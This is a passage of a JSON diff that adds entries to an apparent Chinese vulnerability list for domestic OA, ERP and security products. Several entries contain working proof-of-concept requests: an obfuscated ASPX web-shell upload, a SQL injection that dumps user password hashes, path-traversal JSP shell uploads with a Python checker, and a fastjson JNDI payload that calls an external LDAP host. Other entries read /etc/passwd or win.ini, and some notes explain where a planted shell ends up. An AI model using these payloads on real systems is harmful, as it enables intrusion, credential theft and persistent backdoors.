+  "poc": "POST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1 Host: 10.10.10.1:8888 X-Requested-With: Ext.basex Accept: text/html, application/xhtml+xml, image/jxr, */* Accept-Language: zh-Hans-CN,zh-Hans;q=0.5 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj Accept: */* Origin: http://10.10.10.1 Referer: http://10.10.10.1:8888/Workflow/Workflow.aspx?configID=774d99d7-02bf-42ec-9e27-caeaa699f512&menuitemid=120743&frame=1&modulecode=GTP.Workflow.TaskCenterModule&tabID=40 Cookie: Connection: close Content-Length: 421 ------WebKitFormBoundaryFfJZ4PlAZBixjELj Content-Disposition: form-data; filename=\"1.aspx\";filename=\"1.jpg\" Content-Type: application/text <%@ Page Language=\"Jscript\" Debug=true%> <% var FRWT='XeKBdPAOslypgVhLxcIUNFmStvYbnJGuwEarqkifjTHZQzCoRMWD'; var GFMA=Request.Form(\"qmq1\"); var ONOQ=FRWT(19) + FRWT(20) + FRWT(8) + FRWT(6) + FRWT(21) + FRWT(1); eval(GFMA, ONOQ); %> ------WebKitFormBoundaryFfJZ4PlAZBixjELj--",
+  "label": "nday"
+ },
+ {
+  "vendor": "广联达",
+  "name": "广联达OA未授权访问漏洞",
+  "type": "信息泄露",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "广联达",
+  "name": "广联达OA系统目录遍历漏洞",
+  "type": "目录遍历",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "广联达",
+  "name": "广联达协同办公管理平台存在sql注入漏洞",
+  "type": "SQL注入",
+  "source": "DVB、公众号",
+  "info": "",
+  "date": "08.08",
+  "poc": "POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1 Host: xxx.com Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 88 dasdas=&key=1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --",
+  "label": "nday"
+ },
+ {
+  "vendor": "才茂",
+  "name": "才茂通信网关远程命令执行漏洞",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "未知",
+  "name": "多个厂商运维安全审计系统未授权任意文件上传",
+  "type": "任意文件上传",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "未知"
+ },
+ {
+  "vendor": "未知",
+  "name": "某多个oem 防火墙前台rce 1",
+  "type": "远程命令执行",
+  "source": "DVB",
+  "info": "未公开",
+  "date": "08.08",
+  "poc": "",
+  "label": "未知"
+ },
+ {
+  "vendor": "极限",
+  "name": "极限OA 文件包含攻击",
+  "type": "任意文件读取",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微 E-Mobile7 lang2sql文件覆盖漏洞",
+  "type": "任意文件写入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微-E-Office V9-lnit.php页面存在任意文件上传",
+  "type": "任意文件上传",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微 e-office任意文件读取",
+  "type": "任意文件读取",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微e-cologv9系统WorkflowServiceXmlSOL注入漏洞",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微E-COLOGY CheckServerjsp SQL注入",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微e-cology LoginOperation.jsp RCE",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微E-cology sql注入",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微E-COLOGY V9 OAuth2ServerAction硬编码漏洞",
+  "type": "认证绕过",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微e-cology8 Download.jsp 前台RCE",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微e-cology9 ajaxdata.jsp 前台RCE",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微e-cology9 API/album/frame/delete 前台RCE",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微E-Cology9低于10.56版本browserjsp存在SQL注入漏洞",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微e-cology9系统 ModeDateServiceSQL 注入漏洞",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微e-cology9系统 WorkflowService SQL注入漏洞",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微E-COLOGYV9 doCreateDocument任意文件上传漏洞",
+  "type": "任意文件上传",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微E-cology敏感信息泄露",
+  "type": "信息泄露",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微E-Cology登录绕过",
+  "type": "认证绕过",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微E-mobile6.6 installOperate.do 任意文件上传漏洞",
+  "type": "任意文件上传",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微E-MOBILE6 messageType.do命令执行漏洞",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微E-offic-get_lan.php文件包含漏洞",
+  "type": "文件包含",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微e-office敏感信息泄露",
+  "type": "信息泄露",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微E-Ofice v9.5 系统 flow_xmlphp SQL注入漏洞",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微Emobile7前台管理员登录绕过",
+  "type": "认证绕过",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微eoffice detailphp 注入漏洞",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微Eoffice10 leave_record.php SOL注入漏洞",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微EOFFICE9 do_excelphp 文件写入漏洞漏洞",
+  "type": "任意文件写入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微OA E-Office mysql数据库信息泄漏",
+  "type": "信息泄露",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微OA VerifyGDLoginjsp 登录绕过漏洞",
+  "type": "认证绕过",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微OA 前台任意SQL语句执行",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微oauploaderOperate.jsp任意文件上传漏洞",
+  "type": "任意文件上传",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微OA前台任意SQL语句执行",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "海康威视",
+  "name": "海康威视iSecureCenter综合安防管理平台report前台上传命令执行",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "version<=2.8，厂商修复方式太烂，马儿路径/portal/ui/login/..;/..;/new.jsp",
+  "date": "08.08",
+  "poc": "POST /svm/api/external/report HTTP/1.1 Host: 10.10.10.10 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a ------WebKitFormBoundary9PggsiM755PLa54a Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp\" Content-Type: application/zip <%jsp的马%> ------WebKitFormBoundary9PggsiM755PLa54a--",
+  "label": "nday"
+ },
+ {
+  "vendor": "海康威视",
+  "name": "海康威视IVMS-8700 fastjson命令执行漏洞",
+  "type": "RCE",
+  "source": "DVB、TG",
+  "info": "",
+  "date": "08.08",
+  "poc": "POST /bic/ssoService/v1/applyCT HTTP/1.1 Host: 127.0.0.1 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: cross-site Sec-Fetch-User: ?1 Te: trailers Content-Type: application/json Content-Length: 204 {\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://kjvqweuoav.dnstunnel.run\",\"autoCommit\":true},\"hfe4zyyzldp\":\"=\"}",
+  "label": "nday"
+ },
+ {
+  "vendor": "海康威视",
+  "name": "海康威视IVMS-8700综合安防系统任意文件读取漏洞",
+  "type": "任意文件读取",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "/eps/api/triggerSnapshot/download?token=xxx&fileUrl=file:///C:/windows/win.ini&fileName=1",
+  "label": "nday"
+ },
+ {
+  "vendor": "海康威视",
+  "name": "海康威视IVMS综合安防系统file任意文件上传漏洞",
+  "type": "任意文件上传",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "POST /center/api/files;.html HTTP/1.1 Host: 10.10.10.10 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a ------WebKitFormBoundary9PggsiM755PLa54a Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp\" Content-Type: application/zip <%jsp的马%> ------WebKitFormBoundary9PggsiM755PLa54a-- #!usr/bin/env python # *-* coding:utf-8 *-* import sys import requests import string import random import urllib3 urllib3.disable_warnings() proxies = { 'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080', #127.0.0.1:8080 代理，方便burpsuit抓包 } def run(arg): try: flag=''.join(random.choices(string.ascii_uppercase + string.digits, k = 9)) filename=''.join(random.choices(string.ascii_uppercase + string.digits, k = 10)) vuln_url=arg+\"center/api/files;.js\" headers={'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'} file = {'file': (f'../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{filename}.txt', flag, 'application/octet-stream')} r = requests.post(vuln_url, files=file, timeout=15, verify=False, proxies=proxies) if r.status_code==200 and \"webapps/clusterMgr\" in r.text: payload=f\"clusterMgr/{filename}.txt;.js\" url=arg+payload r2 = requests.get(url, timeout=15, verify=False, proxies=proxies) if r2.status_code==200 and flag in r2.text: print('\\033[1;31;40m') print(arg+f\":存在海康威视isecure center 综合安防管理平台存在任意文件上传漏洞\\nshell地址：{url}\") print('\\033[0m') else: print(arg+\":不存在漏洞\") except: print(arg+\":不存在漏洞\") if __name__ == '__main__': url=sys.argv[1] run(url) POST请求包 POST /center/api/files;.js HTTP/1.1 Host: x.x.x.x User-Agent: python-requests/2.31.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Length: 258 Content-Type: multipart/form-data; boundary=e54e7e5834c8c50e92189959fe7227a4 --e54e7e5834c8c50e92189959fe7227a4 Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/2BT5AV96QW.txt\" Content-Type: application/octet-stream 9YPQ3I3ZS",
+  "label": "nday"
+ },
+ {
+  "vendor": "海康威视",
+  "name": "海康威视安全接入网关任意文件读取",
+  "type": "任意文件读取",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "海康威视",
+  "name": "海康威视安全接入网关前台远程代码执行",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "海康威视",
+  "name": "海康威视移动式安全检察视频球机系统目录所有文件存在任意文件读取漏洞",
+  "type": "任意文件读取",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "海康威视",
+  "name": "海康威视综合安防系统ISecure Center未授权代码执行",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "瑞友",
+  "name": "瑞友天翼- 应用虚拟化系统SOL注入漏洞",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "瑞友",
+  "name": "瑞友天翼应用虚拟化系统ConsoleExternalApi.XGISOL注入漏洞",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "瑞友",
+  "name": "瑞友天翼应用虚拟化系统ConsoleExternalUploadApiXGI SQL注入漏洞",
+  "type": "目录遍历",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "瑞友",
+  "name": "瑞友天翼应用虚拟化系统dologin SQL注入漏洞",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "瑞友",
+  "name": "瑞友天翼应用虚拟化系统GetBSAppUrl SQL注入漏洞",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "用友",
+  "name": "用友nc OAContactsFuzzySearchServlet 反序列化漏洞",
+  "type": "反序列化",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "用友",
+  "name": "用友nc service接口信息泄露漏洞",
+  "type": "信息泄露",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "用友",
+  "name": "用友NCCloudFS文件管理时间盲注",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "用友",
+  "name": "用友ncuapws接口老版本存在数据库账号密码泄露PortalSESInitToolService",
+  "type": "信息泄露",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "用友",
+  "name": "用友NC反序列化远程代码执行漏洞",
+  "type": "反序列化",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "用友",
+  "name": "用友nc文件上传漏洞",
+  "type": "文件上传",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "用友",
+  "name": "用友U8+ sync接口存在任意文件上传",
+  "type": "任意文件上传",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "用友",
+  "name": "用友畅捷通任意文件下载漏洞",
+  "type": "任意文件下载",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "电信",
+  "name": "电信网关配置管理系统rewrite.php 文件上传漏洞",
+  "type": "任意文件上传",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "电信",
+  "name": "电信网关配置管理系统文件上传漏洞",
+  "type": "任意文件上传",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "畅捷通",
+  "name": "畅捷CRM create_site.phpsQL注入",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "畅捷通",
+  "name": "畅捷通 LoadTreeNode目录遍历漏洞",
+  "type": "目录遍历",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "畅捷通",
+  "name": "畅捷通T+ SOL注入漏洞",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "畅捷通",
+  "name": "畅捷通T+存在任意密码重置漏洞",
+  "type": "认证绕过",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "畅捷通",
+  "name": "畅捷通TPlus反序列化命令执行",
+  "type": "反序列化",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "畅捷通",
+  "name": "畅捷通任意文件删除",
+  "type": "任意文件删除",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "禅道",
+  "name": "禅道存在敏感信息泄漏(CVE-2022-37700)",
+  "type": "信息泄露",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "禅道",
+  "name": "禅道权限绕过漏洞",
+  "type": "认证绕过",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "禅道",
+  "name": "禅道系统存在命令执行漏洞",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "禅道",
+  "name": "禅道项目管理系统V16.5登录界面SQL注入漏洞",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "红帆",
+  "name": "红帆oa gzykdxasmx sql注入",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "红帆",
+  "name": "红帆oa newportalasmx sql注入",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "红帆",
+  "name": "红帆oa zyy_attfileasmx sql注入",
+  "type": "SQL注入",
+  "source": "DVB、TG",
+  "info": "DVB-2023-4748",
+  "date": "08.08",
+  "poc": "POST /ioffice/prg/interface/zyy_AttFile.asmx HTTP/1.1 Host: ip User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 Content-Length: 383 Content-Type: text/xml; charset=utf-8 Soapaction: \"http://tempuri.org/GetFileAtt\" Accept-Encoding: czip, veflate Connection: eslose <?xml version=\"1.0\" encoding=\"utf-8\"?> <soap:Envelopexmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><GetFileAttxmlns=\"http://tempuri.org/\"><fileName>123</fileName></GetFileAtt> </soap:Body></soap:Envelope>",
+  "label": "nday"
+ },
+ {
+  "vendor": "网康",
+  "name": "网康 NS-ASG安全网关 index.php 远程命令执行漏洞",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "--18919163681--",
+  "label": "nday"
+ },
+ {
+  "vendor": "网康",
+  "name": "网康NS-ASG安全网关存在信息泄露漏洞(CVE-2023-3792)",
+  "type": "信息泄露",
+  "source": "DVB",
+  "info": "CVE-2023-3792",
+  "date": "08.08",
+  "poc": "Content-Type: application/octet-stream",
+  "label": "nday"
+ },
+ {
+  "vendor": "网康",
+  "name": "网康下一代防火墙 getSysVersion 命令执行漏洞",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "hello smsn 1691564587305",
+  "label": "nday"
+ },
+ {
+  "vendor": "网康",
+  "name": "网康下一代防火墙 HeartBeat.php 远程命令执行漏洞",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "网康",
+  "name": "网康下一代防火墙 perLagent 命令执行漏洞",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "网御星云",
+  "name": "网御USG防火墙系统命令注入漏洞",
+  "type": "命令注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "致远",
+  "name": "致远A8任意文件写入到命令执行",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "致远",
+  "name": "致远OA A6 config;jsp 敏感信息泄漏漏洞",
+  "type": "信息泄露",
+  "source": "DVB、TG",
+  "info": "DVB-2023-4666",
+  "date": "08.08",
+  "poc": "Name: 致远OA A6 config.jsp 敏感信息泄漏漏洞 Description: 北京致远互联软件股份有限公司成立于2002年，总部设立在北京，是一家始终专注于协同管理软件领域的高新技术企业，为客户提供专业的协同管理软件产品、解决方案、平台及云服务，是中国协同管理软件领域的开创者。致远OA A6 config.jsp页面可未授权访问，导致敏感信息泄漏漏洞，攻击者通过漏洞可以获取服务器中的敏感信息。 Identifier: DVB: DVB-2023-4666 VulnClass: - 信息泄漏 Category: - 应用服务 Manufacturer: 用友软件 Product: 用友致远A6 Type: 1 Status: 1 Scanable: 1 Level: 3 DisclosureDate: '2016-11-26' Is0day: false IncludeExp: false Weakable: false IsXc: false IsCommon: false IsCallBack: false Condition: body=\"/seeyon/USER-DATA/IMAGES/LOGIN/login.gif\" || title=\"用友致远OA\" || body=\"/yyoa/\" || header=\"Path=/yyoa\" || server==\"SY8044\" || (body=\"A6-V5企业版\" && body=\"seeyon\" && body=\"seeyonProductId\") || (body=\"/seeyon/common/\" && body=\"var _ctxpath = '/seeyon'\") Solutions: - 请关注厂商的修复版本，并及时更新到最新版本. poc: relative: req0 session: false requests: - method: GET timeout: 10 path: /yyoa/ext/trafaxserver/SystemManage/config.jsp headers: User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.1349.136 Safari/537.36 follow_redirects: true matches: (code.eq(\"200\") && body.contains(\"faxServerIP\") && body.contains(\"faxServerUserName\") && body.contains(\"faxServerPassword\"))",
+  "label": "nday"
+ },
+ {
+  "vendor": "致远",
+  "name": "致远OA A6initDataAssess.isp信息泄露",
+  "type": "信息泄露",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "致远",
+  "name": "致远OA A6信息泄露",
+  "type": "信息泄露",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "致远",
+  "name": "致远OA getAjaxDataServlet 远程代码执行",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "致远",
+  "name": "致远OA /seeyon/ajax.do portalManager-fastjson 反序列化",
+  "type": "反序列化",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "蓝凌",
+  "name": "深圳市蓝凌软件股份有限公司-EKP系统-存在SOL注入漏洞",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "蓝凌",
+  "name": "深圳市蓝凌软件股份有限公司-OA系统-存在SSRF漏洞",
+  "type": "SSRF",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "蓝凌",
+  "name": "深圳市蓝凌软件股份有限公司-OA系统-存在命令执行漏洞",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "V131415",
+  "date": "08.08",
+  "poc": "POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1 Host: www.ynjd.cn:801 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1) Accept: / Connection: Keep-Alive Content-Length: 42 Content-Type: application/x-www-form-urlencoded var={\"body\":{\"file\":\"file:///etc/passwd\"}}",
+  "label": "nday"
+ },
+ {
+  "vendor": "蓝凌",
+  "name": "蓝凌OA getLoginSessionld.html后台登录绕过",
+  "type": "认证绕过",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "蓝凌",
+  "name": "蓝凌OA service.jsp 任意文件上传",
+  "type": "任意文件上传",
+  "source": "DVB",
+  "info": "shell: http://xxx/resource/demodemo.txt HTMLNAME= 为base64编码的文件位置 可以修改成demodemo.jsp 1111111111... 可以修改成木马，但是请求头的值要根据木马长度计算出来数值",
+  "date": "08.08",
